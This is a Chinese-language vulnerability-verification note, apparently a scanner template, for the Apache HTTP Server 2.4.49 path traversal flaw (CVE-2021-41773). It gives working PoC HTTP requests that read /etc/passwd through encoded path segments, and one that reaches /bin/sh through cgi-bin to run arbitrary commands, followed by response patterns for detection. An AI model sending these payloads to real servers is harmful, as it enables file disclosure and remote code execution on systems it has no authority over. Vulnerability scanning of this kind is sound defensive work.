验证漏洞存在方法
    - 发送路径遍历payload检测/etc/passwd文件是否可访问
    - 检测响应中是否包含root用户信息或特定标识符

漏洞利用方法
    - Apache HTTP Server 2.4.49版本存在路径遍历漏洞，攻击者可以通过构造特定的URL路径绕过安全限制，访问服务器上的任意文件
    - 如果CGI脚本未正确配置，攻击者还可以通过此漏洞执行远程代码
    - 
    - **PoC 1 - 路径遍历读取/etc/passwd文件:**
    ```
    GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
    Host: {{Hostname}}
    ```
    
    - **PoC 2 - 替代路径遍历payload:**
    ```
    GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1
    Host: {{Hostname}}
    ```
    
    - **PoC 3 - 远程代码执行(RCE):**
    ```
    POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded
    
    echo Content-Type: text/plain; echo; {{cmd}}
    ```
    
    - **检测方法:**
      - 对于LFI（本地文件包含）：检查响应中是否包含"root:.*:0:0:"模式
      - 对于RCE（远程代码执行）：检查响应中是否包含"CVE-2021-41773-POC"标识符
